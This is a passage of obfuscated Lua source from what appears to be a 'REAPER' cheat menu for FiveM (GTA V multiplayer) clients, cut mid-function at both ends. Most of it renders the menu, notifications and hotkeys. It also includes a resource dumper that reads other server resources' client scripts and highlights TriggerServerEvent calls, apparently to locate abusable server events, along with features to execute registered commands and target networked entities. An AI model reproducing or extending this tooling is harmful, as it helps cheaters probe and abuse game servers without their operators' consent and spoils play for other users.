                                table.insert(__REAPER1__.T.Display[resoName], {text = '__resource.lua', dkey = resoName .. '__resource.lua' .. 'Ma1sj87/%', desc = '__resource.lua resource file.', afu = __REAPER1__.M.scripts.dumper.dump, option = __REAPER1__.M.Button, extra = files, extra2 = name .. ' | __resource.lua'})
                            else
                                table.insert(__REAPER1__.T.Display[resoName], {text = 'fxmanifest.lua', dkey = resoName .. 'fxmanifest.lua' .. 'Ma1sj87/%', desc = 'fxmanifest.lua resource file.', afu = __REAPER1__.M.scripts.dumper.dump, option = __REAPER1__.M.Button, extra = files, extra2 = name .. ' | fxmanifest.lua'})
                            end
                            
                            if files then
                                for k,v in ipairs(__REAPER1__.F.StringSplit(files, "\n")) do
                                    local s1, s2 = string.find(v, ".lua", 1, true) or string.find(v, ".html", 1, true) or string.find(v, ".css", 1, true) or string.find(v, ".js", 1, true)

                                    if s1 then
                                        local filename = __REAPER1__.F.CleanString(v)
                                        local thefiles = __REAPER1__.N.LoadResourceFile(name, filename)
                                        if thefiles then
                                            table.insert(__REAPER1__.T.Display[resoName], {text = filename, dkey = resoName .. filename .. k .. 'Ma1sj87/%', desc = filename .. ' resource file.', afu = __REAPER1__.M.scripts.dumper.dump, option = __REAPER1__.M.Button, extra = thefiles, extra2 = name .. ' | ' .. filename})
                                        end
                                    end
                                end
                            end
                        end
                    end
                elseif __REAPER1__.M.CurrentMenu == 'world:hover' then
                    if __REAPER1__.T.Display[__REAPER1__.M.CurrentMenu][1].func then
                        local coords, v = __REAPER1__.M.RayCastGameplayCamera(400.0)
                        
                        if v and not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.N.NetworkGetEntityIsNetworked(v) then
                            local t = __REAPER1__.N.GetEntityType(v)
                            
                            if v ~= __REAPER1__.V.HoverEnt then
                                __REAPER1__.V.HoverEnt = v
                                __REAPER1__.F.AddNotification('Hover entity changed.', 1000, 200, 200, 200)
                            end

                            if t ~= __REAPER1__.V.HoverEntType then
                                __REAPER1__.V.HoverEntType = t
                                __REAPER1__.M.HoverMenu = t == 1 and __REAPER1__.T.Display['world:hover:ped'] or t == 2 and __REAPER1__.T.Display['world:hover:veh'] or __REAPER1__.T.Display['world:hover:obj']

                                if __REAPER1__.T.Display[__REAPER1__.M.CurrentMenu][1].func ~= __REAPER1__.M.HoverMenu[1].func then
                                    __REAPER1__.M.HoverMenu[1].func = __REAPER1__.T.Display[__REAPER1__.M.CurrentMenu][1].func
                                end

                                __REAPER1__.T.Display['world:hover'] = __REAPER1__.M.HoverMenu
                            end
                        end
                    end

                    if __REAPER1__.V.HoverEnt and not __REAPER1__.N.DoesEntityExist(__REAPER1__.V.HoverEnt) then
                        __REAPER1__.V.HoverEnt, __REAPER1__.V.HoverEntType = nil, nil
                        __REAPER1__.T.Display['world:hover'] = {{text = 'Active', dkey = 'world:hover_active', desc = 'If active when you hover to a new entity,\nthe menu will change to that.', option = __REAPER1__.M.Checkbox, func = __REAPER1__.T.Display[__REAPER1__.M.CurrentMenu][1].func}}
                    end
                elseif __REAPER1__.M.CurrentMenu == 'scripts:commands:default' or __REAPER1__.M.CurrentMenu == 'scripts:commands:custom' then
                    local commands = __REAPER1__.N.GetRegisteredCommands()
                    if #commands ~= __REAPER1__.V.OverallCommands then
                        __REAPER1__.V.OverallCommands = #commands

                        for k,v in ipairs(__REAPER1__.N.GetRegisteredCommands()) do
                            if v["name"] and not __REAPER1__.T.DefaultCommands[v["name"]] then
                                table.insert(__REAPER1__.T.Display['scripts:commands:custom'], {text = v["name"], dkey = "scripts" .. v["name"] .. k, desc = "Press enter to execute this command.", afu = __REAPER1__.M.scripts.commands.execute, option = __REAPER1__.M.Button, extra = v["name"]})
                            elseif v["name"] and __REAPER1__.T.DefaultCommands[v["name"]] then
                                table.insert(__REAPER1__.T.Display['scripts:commands:default'], {text = v["name"], dkey = "scripts" .. v["name"] .. k, desc = "Press enter to execute this command.", afu = __REAPER1__.M.scripts.commands.execute, option = __REAPER1__.M.Button, extra = v["name"]})
                            end
                        end
                    end
                end
            end

            if __REAPER1__.T.Notifications[1] then
                if __REAPER1__.M.NotificationAlpha ~= 255 then
                    __REAPER1__.M.NotificationAlpha = __REAPER1__.M.NotificationAlpha + 15
                end

                __REAPER1__.M.NotifyOpts = 0
                for k,v in ipairs(__REAPER1__.T.Notifications) do
                    local add = 0.025 * __REAPER1__.M.NotifyOpts
                    __REAPER1__.N.DrawRect(0.851, 0.331 + add, 0.012, 0.023, v.colorR, v.colorG, v.colorB, 160)--sz??m
                    __REAPER1__.N.DrawRect(0.9265, 0.331 + add, 0.137, 0.023, v.colorR, v.colorG, v.colorB, 160)
                    __REAPER1__.N.DrawRect(0.851, 0.331 + add, 0.01, 0.021, 35, 35, 35, 210)--sz??m
                    __REAPER1__.N.DrawRect(0.9265, 0.331 + add, 0.136, 0.021, 35, 35, 35, 210)
                    __REAPER1__.F.DrawText(v.number, 0.851, 0.321 + add, 4, 255, 255, 255, 240, 0.28, true, false, true)
                    __REAPER1__.F.DrawText(v.notify, 0.8605, 0.322 + add, 0, 255, 255, 255, 240, 0.195)

                    if __REAPER1__.N.GetGameTimer() - v.time > v.dur then
                        table.remove(__REAPER1__.T.Notifications, k)
                    end

                    __REAPER1__.M.NotifyOpts = __REAPER1__.M.NotifyOpts + 1
                end
            elseif __REAPER1__.M.NotificationAlpha ~= 0 then
                __REAPER1__.M.NotificationAlpha = __REAPER1__.M.NotificationAlpha - 15
            end

            if __REAPER1__.M.NotificationAlpha > 0 then
                __REAPER1__.N.DrawSprite('__REAPER5__', '__REAPER6__', 0.92, 0.3, 0.15, 0.033, 0.0, 255, 255, 255, __REAPER1__.M.NotificationAlpha)
            end

            if not __REAPER1__.M.TextboxWriting then
                for k,v in ipairs(__REAPER1__.T.KeysHam['binds']) do
                    if __REAPER1__.N.IsKeyReleased(v.key) then
                        for _k,_v in ipairs(v.dkeys) do
                            local bind = __REAPER1__.A[_v]
                            if bind and bind.tipus ~= 'bind' then
                                if bind.option == __REAPER1__.M.Checkbox then
                                    bind.func = not bind.func
                                elseif bind.option == __REAPER1__.M.Combo then
                                    bind.sindex = bind.cindex
                                    if bind.toggle ~= nil then
                                        bind.toggle = not bind.toggle
                                    end
                                elseif bind.option == __REAPER1__.M.Menu_Button then
                                    if __REAPER1__.M.CurrentMenu then
                                        __REAPER1__.M.MenuRequest('set', __REAPER1__.A[__REAPER1__.M.CurrentMenu])
                                    else
                                        __REAPER1__.F.OpenMenu()
                                    end
                                    if __REAPER1__.M.CurrentMenu ~= bind.func[2] then
                                        __REAPER1__.M.Options = 0
                                        __REAPER1__.M.CurrentMenu = bind.func[2]
                                        __REAPER1__.M.MenuRequest('request', __REAPER1__.A[bind.func[2]])
                                    end
                                end
    
                                if bind.afu then
                                    local _, er = pcall(function()
                                        bind.afu(bind.dkey, bind.func, bind.cindex, bind.sindex, bind.toggle, bind.extra, bind.extra2)
                                    end)
        
                                    if er then
                                        __REAPER1__.F.AddNotification('Fatal fumction error! Check F8 console.', 10000, 255, 0, 0)
                                        --[[Ham.printStr]]print("FUNCTION ERROR (3)", '\n^4' .. er)
                                    end
                                end
                                __REAPER1__.N.PlaySound('def', -1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                            elseif bind.tipus ~= 'bind' then
                                if #v.dkeys == 1 then
                                    table.remove(__REAPER1__.T.KeysHam['binds'], k)
                                else
                                    table.remove(__REAPER1__.T.KeysHam['binds'][k].dkeys, _k)
                                end
                            end
                        end
                    end

                    __REAPER1__.F.CheckInputThisFrame(__REAPER1__.T.KeysHam['all'][v.key])
                end
            end
        end
    end)

    __REAPER1__.F.BiteDecode = function(data)
        local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        data = string.gsub(data, '[^'..b..'=]', '')
        return (data:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r;
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
                return string.char(c)
        end))
    end

    __REAPER1__.F.LeftArrow = __REAPER1__.F.BiteDecode('wqsg')
    __REAPER1__.F.RightArrow = __REAPER1__.F.BiteDecode('IMK7')

    __REAPER1__.N.RandomString = function(len)
        local rstr = ""
        for i = 1, len do
            rstr = rstr .. string.char(math.random(97, 122))
        end
        return rstr
    end

    __REAPER1__.F.StringSplit = function(inputstr, sep)
        if sep == nil then
            sep = "%s"
        end
        local t={} ; i=1
        for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            t[i] = str
            i = i + 1
        end
        return t
    end

    __REAPER1__.F.AdvStringSplit = function(length, word, split, isnum)
        local split = __REAPER1__.F.StringSplit(word, split)
        if length == 2 then
            if not isnum then
                return split[1], split[2]
            else
                return tonumber(split[1]), tonumber(split[2])
            end
        elseif length == 3 then
            if not isnum then
                return split[1], split[2],split[3]
            else
                return tonumber(split[1]), tonumber(split[2]), tonumber(split[3])
            end
        elseif length == 4 then
            if not isnum then
                return split[1], split[2], split[3], split[4]
            else
                return tonumber(split[1]), tonumber(split[2]), tonumber(split[3]), tonumber(split[4])
            end
        elseif length == 5 then
            if not isnum then
                return split[1], split[2], split[3], split[4], split[5]
            else
                return tonumber(split[1]), tonumber(split[2]), tonumber(split[3]), tonumber(split[4]), tonumber(split[5])
            end
        end

        return false
    end

    __REAPER1__.F.FloatLength = function(float, length)
        return tonumber(string.format('%.' .. length .. 'f', float))
    end

    __REAPER1__.F.IntToFloat = function(int)
        local stringToNum = tonumber(int .. '.0')
        return stringToNum
    end

    __REAPER1__.F.TableToColor = function(tabla)
        return tabla.r, tabla.g, tabla.b, tabla.a or 255
    end

    __REAPER1__.F.CleanString = function(str)
        if str:find("'") then
            local a, b = string.find(str, "%b''")
            str = str:sub(a + 1, b - 1)
        elseif str:find('"') then
            local a, b = string.find(str, '%b""')
            str = str:sub(a + 1, b - 1)
        end
        return str
    end

    __REAPER1__.N.AddTextEntry('__REAPER4__', '~a~~a~~a~')
    __REAPER1__.F.DrawText = function(text, x, y, font, r, g, b, a, scale, center, shadow, outline, alignright, wrap1, wrap2)
        local text = tostring(text)
        __REAPER1__.N.TextEntry('__REAPER4__')
        __REAPER1__.N.TextCentre(center)
        __REAPER1__.N.TextRightJustify(alignright)
        __REAPER1__.N.TextFont(font)
        __REAPER1__.N.TextScale(0.0, scale)
        __REAPER1__.N.TextColor(r, g, b, a)
        if shadow then
            __REAPER1__.N.TextShadow()
        end
        if outline then
            __REAPER1__.N.TextOutline()
        end
        if alignright then
            __REAPER1__.N.TextWrap(wrap1, wrap2)
        end

        __REAPER1__.N.TextString(text)
        __REAPER1__.N.TextDraw(x, y)
    end

    __REAPER1__.F.TextWidth = function(text, scale)
        __REAPER1__.N.BeginTextWidth("STRING")
        __REAPER1__.N.TextFont(4)
        __REAPER1__.N.TextScale(0, scale)
        __REAPER1__.N.TextString(text)
        return __REAPER1__.N.TextWidth(false)
     
        --return string.len(text) / 250
     end

    __REAPER1__.F.SetMenu = function(set, request)
        if __REAPER1__.M.CurrentMenu == 'weapon:editor' then
            __REAPER1__.M.WeaponEditorMenu = __REAPER1__.M.Submenu[2]
            __REAPER1__.M.WeaponEditorWeapon = __REAPER1__.N.GetHashKey('weapon_' .. __REAPER1__.F.StringSplit(__REAPER1__.M.WeaponEditorMenu, ':')[2])
        else
            __REAPER1__.M.MenuRequest('set', __REAPER1__.A[set])
            if request == 'server:onlineplayers' or set == 'server:onlineplayers' then
                __REAPER1__.V.OPPly = nil
            end
        end

        __REAPER1__.M.CurrentMenu = request
        __REAPER1__.M.MenuRequest('request', __REAPER1__.A[request])
        __REAPER1__.N.PlaySound('def', -1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
    end

    __REAPER1__.F.MenuExtra = function(extra)
        local menu = __REAPER1__.A[extra]
        return menu.menuextra.r, menu.menuextra.g, menu.menuextra.b, menu.menuextra.a
    end

    __REAPER1__.F.PageHandler = function(text, tipus, dkey, desc, hotkey, risky, menuextra, func, func2, maxopcio, cindex)
        if __REAPER1__.M.Options <= 13 + __REAPER1__.M.AddedOptions and __REAPER1__.M.Options >= 0 + __REAPER1__.M.AddedOptions then
            local textUp = __REAPER1__.M.CurrentMenu ~= 'vehicle:handling' and __REAPER1__.M.CurrentMenu ~= 'scripts:dumper' and __REAPER1__.M.CurrentMenu ~= 'scripts:commands:default' and __REAPER1__.M.CurrentMenu ~= 'scripts:commands:custom' and string.upper(text) or text
            __REAPER1__.M.CurrentDisplay = __REAPER1__.M.Options - __REAPER1__.M.AddedOptions
            __REAPER1__.M.ButtonPosition = __REAPER1__.A['settings_positiony'].func[__REAPER1__.A['settings_positiony'].sindex - 1] + 0.0265 * __REAPER1__.M.CurrentDisplay + 0.008
            local xpos, xwidth = __REAPER1__.A['settings_positionx'].func[__REAPER1__.A['settings_positionx'].sindex - 1], __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1]
            local rect = xpos + xwidth / 2
            local rectx = __REAPER1__.M.ButtonPosition + 0.014
    
            if tipus == 'separator' then
                local xhalf = xwidth / 2
                local sepx = rect - xhalf + xhalf / 2
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx, rectx, xwidth - 0.08, 0.025, 0.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx, rectx, xwidth - 0.08, 0.025, 0.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx, rectx, xwidth - 0.08, 0.025, 0.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx, rectx, xwidth - 0.08, 0.025, 0.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx, rectx, xwidth - 0.08, 0.025, 0.0, 0, 0, 0, __REAPER1__.M.MenuAlpha, true)

                local xhalf = xwidth / 2
                local sepx2 = rect + xhalf - xhalf / 2
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx2, rectx, xwidth - 0.08, 0.025, 180.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx2, rectx, xwidth - 0.08, 0.025, 180.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx2, rectx, xwidth - 0.08, 0.025, 180.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx2, rectx, xwidth - 0.08, 0.025, 180.0, 37, 37, 37, __REAPER1__.M.MenuAlpha, true)
                __REAPER1__.N.DrawSprite('timerbars', 'lhs_bg', sepx2, rectx, xwidth - 0.08, 0.025, 180.0, 0, 0, 0, __REAPER1__.M.MenuAlpha, true)


                __REAPER1__.N.DrawSprite('__REAPER13__', '__REAPER14__', rect, rectx, xwidth, 0.0265, 0.0, 255, 255, 255, __REAPER1__.M.MenuBackgroundAlpha)
                __REAPER1__.F.DrawText(textUp, rect, __REAPER1__.M.ButtonPosition + 0.002, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.33, true)

                local textUp = string.len(textUp) / 550
                __REAPER1__.N.DrawSprite('__REAPER14__', '__REAPER15__', - textUp + (rect - 0.00355), __REAPER1__.M.ButtonPosition + 0.0137, 0.003, 0.017, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha - 25)
                __REAPER1__.N.DrawSprite('__REAPER15__', '__REAPER16__', textUp + (rect + 0.00355), __REAPER1__.M.ButtonPosition + 0.0137, 0.003, 0.017, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha - 25)
            else
                if __REAPER1__.M.CursorToggle and __REAPER1__.M.ScreenResox * xpos < __REAPER1__.M.Mousex and __REAPER1__.M.ScreenResox * (xpos + xwidth) > __REAPER1__.M.Mousex and __REAPER1__.M.ScreenResoy * __REAPER1__.M.ButtonPosition < __REAPER1__.M.Mousey and __REAPER1__.M.ScreenResoy * (__REAPER1__.M.ButtonPosition + 0.0265) > __REAPER1__.M.Mousey then
                    __REAPER1__.M.ScrollOption, __REAPER1__.M.SelectedOption, __REAPER1__.M.CursorHovering = __REAPER1__.M.CurrentDisplay, __REAPER1__.M.Options + 1, true
                end
                
                if __REAPER1__.M.Options == __REAPER1__.M.SelectedOption - 1 then
                    __REAPER1__.M.FoundOption = true
                    if tipus == 'submenu' then
                        __REAPER1__.N.DrawSprite('__REAPER23__', '__REAPER24__', rect, rectx, xwidth, 0.0265, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                    else
                        __REAPER1__.N.DrawRect(rect, rectx, xwidth, 0.0265, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                    end
    
                    if tipus == 'checkbox' then
                        __REAPER1__.N.DrawSprite('timerbar_sr', func and 'timer_tick' or 'timer_cross', xpos + __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] - 0.0195, __REAPER1__.M.ButtonPosition + 0.0135, 0.01, 0.018, 0.0, 10, 10, 10, func and __REAPER1__.M.MenuAlpha - 20 or __REAPER1__.M.MenuAlpha - 40, true)
                    elseif func and func2 == nil then
                        if menuextra and menuextra.r then
                            __REAPER1__.N.DrawSprite('mprankbadge', 'globe_bg', xpos + __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] - 0.0195, __REAPER1__.M.ButtonPosition + 0.0135, 0.0165, 0.028, 0.0, menuextra.r, menuextra.g, menuextra.b, __REAPER1__.M.MenuAlpha, true)
                            __REAPER1__.F.DrawText(func, xpos, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 0, 0, 0, __REAPER1__.M.MenuAlpha, 0.37, false, false, false, true, xpos, xpos + xwidth - 0.028)
                        else
                            __REAPER1__.F.DrawText(func, xpos, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 0, 0, 0, __REAPER1__.M.MenuAlpha, 0.37, false, false, false, true, xpos, xpos + xwidth - 0.012)
                        end
                    elseif func and func2 ~= nil then
                        __REAPER1__.F.DrawText(func, xpos, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 0, 0, 0, __REAPER1__.M.MenuAlpha, 0.37, false, false, false, true, xpos, xpos + xwidth - 0.03)
                        __REAPER1__.N.DrawSprite('timerbar_sr', func2 and 'timer_tick' or 'timer_cross', xpos + 0.1735, __REAPER1__.M.ButtonPosition + 0.0135, 0.01, 0.018, 0.0, 10, 10, 10, func and __REAPER1__.M.MenuAlpha - 20 or __REAPER1__.M.MenuAlpha - 40, true)
                    end
    
                    if __REAPER1__.N.IsKeyReleased(__REAPER1__.A['settings_bind'].extra) then
                        __REAPER25__(function()
                            __REAPER1__.F.TextBox('', dkey, 'bind', 'vegyes', 1, 'Hotkey')
                        end)
                    end
                    if not __REAPER1__.M.TextboxWriting and __REAPER1__.A['settings_infobox'].func then
                        __REAPER1__.F.InfoBox(desc, hotkey, risky, func)
                    end
    
                    if __REAPER1__.A['settings_images'].func then
                        if menuextra == 'image_weapon' or __REAPER1__.M.CurrentMenu == 'weapon:editor' then
                            __REAPER1__.N.DrawSprite('__REAPER3__', '__REAPER4__', xpos + xwidth + 0.047, __REAPER1__.M.ButtonPosition + 0.01325, 0.09, 0.09, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                        elseif menuextra == 'image_model' then
                            __REAPER1__.N.DrawSprite('__REAPER4__', '__REAPER5__', xpos + xwidth + 0.027, __REAPER1__.M.ButtonPosition + 0.01325, 0.05, 0.15, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                        elseif menuextra == 'image_vehicle' then
                            __REAPER1__.N.DrawSprite('__REAPER7__', '__REAPER8__', xpos + xwidth + 0.047, __REAPER1__.M.ButtonPosition + 0.01325, 0.09, 0.09, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                        end
                    end

                    if __REAPER1__.M.CurrentMenu == 'server:onlineplayers' then
                        if __REAPER1__.T.MugshotTabla[textUp] and __REAPER1__.N.DoesEntityExist(__REAPER1__.T.MugshotTabla[textUp].ped) and __REAPER1__.N.IsPedheadshotReady(__REAPER1__.T.MugshotTabla[textUp].handle) and __REAPER1__.N.IsPedheadshotValid(__REAPER1__.T.MugshotTabla[textUp].handle) then
                            local txd = __REAPER1__.N.GetPedheadshotTxdString(__REAPER1__.T.MugshotTabla[textUp].handle)
                            __REAPER1__.N.DrawSprite(txd, txd, xpos + 0.02, __REAPER1__.M.ButtonPosition + 0.0133, 0.014, 0.025, 0, 255, 255, 255, __REAPER1__.M.MenuAlpha - 45)
                        end
                        __REAPER1__.F.DrawText(textUp, xpos + 0.029, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 0, 0, 0, __REAPER1__.M.MenuAlpha, 0.4)
    
                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 215) and __REAPER1__.T.Display[dkey] == nil then
                            __REAPER1__.F.ApplyOMenu(dkey)
                        end
                    elseif string.find(dkey, "Ma1sj87/%", 1, true) then
                        __REAPER1__.V.ResoOption = 0

                        __REAPER1__.F.DrawText(text, xpos + 0.012, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 0, 0, 0, __REAPER1__.M.MenuAlpha, 0.4)

                        if text ~= __REAPER1__.V.CurrResource then
                            __REAPER1__.V.CurrResource = text
                            __REAPER1__.V.LoadedResource = __REAPER1__.N.LoadResourceFile(__REAPER1__.A[__REAPER1__.M.CurrentMenu].text, text)

                            __REAPER1__.V.ResoScrollMin, __REAPER1__.V.ResoScrollMax = 52, 0
                        end

                        local ypos = __REAPER1__.A['settings_positiony'].func[__REAPER1__.A['settings_positiony'].sindex - 1]

                        if __REAPER1__.V.LoadedResource then
                            for k,v in ipairs(__REAPER1__.F.StringSplit(__REAPER1__.V.LoadedResource, "\n")) do
                                if __REAPER1__.V.ResoOption <= __REAPER1__.V.ResoScrollMin and __REAPER1__.V.ResoOption >= __REAPER1__.V.ResoScrollMax then
                                    local curdis = __REAPER1__.V.ResoOption - __REAPER1__.V.ResoScrollMin
                                    local buttonpos = 0.015 * curdis

                                    __REAPER1__.N.DrawRect((xpos * 2) + xwidth + __REAPER1__.M.RDatax + 0.03, ypos + 0.68 + buttonpos + __REAPER1__.M.RDatay, 0.26, 0.015, 10, 10, 10, 240)  

                                    local r, g, b = 255, 255, 255

                                    if string.find(v, "TriggerServerEvent", 1, true) then
                                        r, g, b = 255, 50, 50
                                    elseif string.find(v, "TriggerEvent", 1, true) then
                                        r, g, b = 255, 255, 0
                                    elseif string.find(v, "AddEventHandler", 1, true) then
                                        r, g, b = 80, 200, 255
                                    elseif string.find(v, "--", 1, true) then
                                        r, g, b = 120, 120, 120
                                    end

                                    __REAPER1__.F.DrawText(v, (xpos) + xwidth + __REAPER1__.M.RDatax + 0.001, ypos + 0.67 + buttonpos + __REAPER1__.M.RDatay, __REAPER1__.A['settings_font'].sindex, r, g, b, __REAPER1__.M.MenuAlpha, 0.28)
                                end
                                __REAPER1__.V.ResoOption = __REAPER1__.V.ResoOption + 1
                            end
                        end

                        __REAPER1__.N.DisableControlAction(0, 16, true)
                        __REAPER1__.N.DisableControlAction(0, 17, true)

                        if __REAPER1__.N.IsDisabledControlPressed(0, 16) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.N.ScrollWait or 0) and __REAPER1__.V.ResoScrollMin < __REAPER1__.V.ResoOption - 1 then
                            __REAPER1__.M.ScrollWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_scrollspeed'].sindex

                            __REAPER1__.V.ResoScrollMin, __REAPER1__.V.ResoScrollMax = __REAPER1__.V.ResoScrollMin + 1, __REAPER1__.V.ResoScrollMax + 1
                        elseif __REAPER1__.N.IsDisabledControlPressed(0, 17) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.N.ScrollWait or 0) then
                            __REAPER1__.M.ScrollWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_scrollspeed'].sindex

                            __REAPER1__.V.ResoScrollMin, __REAPER1__.V.ResoScrollMax = __REAPER1__.V.ResoScrollMin ~= 52 and __REAPER1__.V.ResoScrollMin - 1 or 52, __REAPER1__.V.ResoScrollMax ~= 0 and __REAPER1__.V.ResoScrollMax - 1 or 0
                        end
                        
                    else
                        __REAPER1__.F.DrawText(textUp, xpos + 0.012, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 0, 0, 0, __REAPER1__.M.MenuAlpha, 0.4)
                    end
                else
                    if __REAPER1__.M.OverallOptions > 13 and __REAPER1__.M.CurrentDisplay < 13 or __REAPER1__.M.OverallOptions <= 13 and __REAPER1__.M.CurrentDisplay ~= __REAPER1__.M.OverallOptions - 1 then
                        if __REAPER1__.M.PageOptions == 1 or __REAPER1__.M.PageOptions == 3 or __REAPER1__.M.PageOptions == 4 or __REAPER1__.M.PageOptions == 6 or __REAPER1__.M.PageOptions == 9 or __REAPER1__.M.PageOptions == 11 or __REAPER1__.M.PageOptions == 12 then
                            if tipus == 'submenu' then
                                __REAPER1__.N.DrawSprite('__REAPER20__', '__REAPER21__', rect, rectx, xwidth, 0.0265, 0.0, 255, 255, 255, __REAPER1__.M.MenuBackgroundAlpha)
                            else
                                __REAPER1__.N.DrawSprite('__REAPER11__', '__REAPER12__', rect, rectx, xwidth, 0.0265, 0.0, 255, 255, 255, __REAPER1__.M.MenuBackgroundAlpha)
                            end
                        else
                            if tipus == 'submenu' then
                                __REAPER1__.N.DrawSprite('__REAPER21__', '__REAPER22__', rect, rectx, xwidth, 0.0265, 0.0, 255, 255, 255, __REAPER1__.M.MenuBackgroundAlpha)
                            else
                                __REAPER1__.N.DrawSprite('__REAPER12__', '__REAPER13__', rect, rectx, xwidth, 0.0265, 0.0, 255, 255, 255, __REAPER1__.M.MenuBackgroundAlpha)
                            end
                        end
                    else
                        if tipus == 'submenu' then
                            __REAPER1__.N.DrawSprite('__REAPER22__', '__REAPER23__', rect, rectx, xwidth, 0.0265, 0.0, 255, 255, 255, __REAPER1__.M.MenuBackgroundAlpha)
                        else
                          __REAPER1__.N.DrawRect(rect, rectx, xwidth, 0.0265, 29, 29, 29, __REAPER1__.M.MenuBackgroundAlpha)
                        end
                    end
    
                    if tipus == 'checkbox' then
                        __REAPER1__.N.DrawSprite('timerbar_sr', func and 'timer_tick' or 'timer_cross', xpos + __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] - 0.0195, __REAPER1__.M.ButtonPosition + 0.0135, 0.01, 0.018, 0.0, func and 255 or 230, func and 255 or 230, func and 255 or 230, func and __REAPER1__.M.MenuAlpha - 20 or __REAPER1__.M.MenuAlpha - 40, true)
                    elseif func and func2 == nil then
                        if tipus == 'combo' then
                            if __REAPER1__.A['settings_comboslider'].func then
                                __REAPER1__.N.DrawRect(xpos + __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] - 0.019, __REAPER1__.M.ButtonPosition + 0.0135, 0.02, 0.002, 170, 170, 170, __REAPER1__.M.MenuAlpha)
                                __REAPER1__.N.DrawSprite('mprankbadge', 'globe_bg', (xpos + __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] - 0.0265) + 0.017 / (maxopcio > 1 and maxopcio - 1 or 1) * (cindex - 1), __REAPER1__.M.ButtonPosition + 0.0135, 0.0085, 0.0155, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha, true)
                            else
                                __REAPER1__.F.DrawText(func, xpos, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.37, false, false, false, true, xpos, xpos + xwidth - 0.012)
                            end
                        elseif menuextra and menuextra.r then
                            __REAPER1__.N.DrawSprite('mprankbadge', 'globe_bg', xpos + __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] - 0.0195, __REAPER1__.M.ButtonPosition + 0.0135, 0.0165, 0.028, 0.0, menuextra.r, menuextra.g, menuextra.b, __REAPER1__.M.MenuAlpha, true)
                            __REAPER1__.F.DrawText(func, xpos, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.37, false, false, false, true, xpos, xpos + xwidth - 0.028)
                        else
                            __REAPER1__.F.DrawText(func, xpos, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.37, false, false, false, true, xpos, xpos + xwidth - 0.012)
                        end
                    elseif func and func2 ~= nil then
                        __REAPER1__.N.DrawRect(xpos + 0.15, __REAPER1__.M.ButtonPosition + 0.0135, 0.02, 0.002, 170, 170, 170, __REAPER1__.M.MenuAlpha)
                        __REAPER1__.N.DrawSprite('mprankbadge', 'globe_bg', (xpos + 0.1425) + 0.017 / (maxopcio > 1 and maxopcio - 1 or 1) * (cindex - 1), __REAPER1__.M.ButtonPosition + 0.0135, 0.0085, 0.0155, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha, true)
